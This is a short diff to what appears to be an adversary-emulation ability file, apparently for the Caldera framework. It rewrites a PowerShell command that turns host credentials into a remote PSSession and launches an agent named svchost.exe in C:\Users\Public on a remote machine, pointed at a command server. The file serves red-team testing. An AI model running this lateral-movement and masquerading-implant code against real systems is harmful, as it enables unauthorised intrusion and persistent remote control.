@@ -12,17 +12,15 @@
     windows:
       psh:
         command: |
-          $job = Start-Job -ScriptBlock{
-            $username = "#{host.user.name}";
-            $password = "#{host.user.password}";
-            $secstr = New-Object -TypeName System.Security.SecureString;
-            $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
-            $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
-            $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
-            Invoke-Command -ComputerName ${remote.host.name} -Session $session -ScriptBlock{Start-Process C:\Users\Public\svchost.exe -ArgumentList "-server #{server} -executor psh" -NoNewWindows -PassThru}
-            Remove-PSSession -Session $session
-          };
-          Receive-Job -Job $job -Wait;
+          $username = "#{host.user.name}";
+          $password = "#{host.user.password}";
+          $secstr = New-Object -TypeName System.Security.SecureString;
+          $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+          $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+          $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
+          Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\svchost.exe -server #{server} -executor psh}};
+          Start-Sleep -s 5;
+          Remove-PSSession -Session $session;
         payload: sandcat.go-windows
         cleanup: |
           Remove-Item C:\Users\Public\svchost.exe -Recurse
